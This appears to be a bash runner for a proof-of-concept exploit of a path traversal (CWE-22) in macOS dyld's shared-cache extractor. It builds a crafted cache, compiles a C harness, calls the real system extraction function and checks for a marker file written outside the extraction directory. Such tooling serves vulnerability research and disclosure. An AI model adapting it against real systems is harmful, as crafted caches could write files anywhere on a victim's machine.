#!/usr/bin/env bash
# DSC-EXTRACTOR-TRAVERSAL-1 — Real-Target Gate A runner
#
# Invokes dyld_shared_cache_extract_dylibs_progress() from the system
# dsc_extractor.bundle via dlopen() — NOT a reimplementation.
#
# Requirements: macOS + Xcode (or Command Line Tools), cc, python3
# Usage: bash run_real_poc.sh

set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
cd "$SCRIPT_DIR"

echo "=================================================="
echo " DSC-EXTRACTOR-TRAVERSAL-1 — Real-Target Gate A"
echo " CWE-22 Path Traversal — dyld dsc_extractor.cpp"
echo " PoC: dyld_shared_cache_extract_dylibs_progress()"
echo "=================================================="
echo ""

OS="$(uname -s)"
if [[ "$OS" != "Darwin" ]]; then
  echo "[!] ERROR: dsc_extractor.bundle requires macOS."
  echo "    This PoC must run on macOS with Xcode installed."
  exit 1
fi

echo "[1/4] Building malicious dyld shared cache..."
python3 gen_malicious_dsc.py malicious_ci.cache
echo "      SHA-256: $(shasum -a 256 malicious_ci.cache | awk '{print $1}')"
echo ""

echo "[2/4] Compiling real-target PoC (dsc_real_poc.c)..."
cc -O2 -o dsc_real_poc dsc_real_poc.c
echo "      Build: OK"
echo ""

TRAVERSAL_TARGET="/tmp/poc_dsc_traversal_proof"
echo "[3/4] Pre-run check: $TRAVERSAL_TARGET must NOT exist..."
rm -f "$TRAVERSAL_TARGET"
echo "      Confirmed absent."
echo ""

echo "[4/4] Invoking dyld_shared_cache_extract_dylibs_progress()..."
OUTDIR="$(mktemp -d /tmp/dsc_poc_XXXXXX)"
echo "      Extraction directory: $OUTDIR"
echo ""

./dsc_real_poc malicious_ci.cache "$OUTDIR"

echo ""
echo "=================================================="
if [ -e "$TRAVERSAL_TARGET" ]; then
  echo " TRAVERSAL CONFIRMED (Gate A)"
  echo " File written OUTSIDE extraction directory:"
  ls -la "$TRAVERSAL_TARGET"
  echo " Content: $(cat "$TRAVERSAL_TARGET")"
  echo ""
  echo " Extraction dir (should be empty):"
  ls -la "$OUTDIR/" 2>/dev/null | head -5 || true
else
  echo " NOT TRIGGERED — see dsc_real_poc output above"
  exit 1
fi
echo "=================================================="
echo ""
echo "Gate D — SHA-256 of PoC artifacts:"
shasum -a 256 gen_malicious_dsc.py malicious_ci.cache dsc_real_poc.c
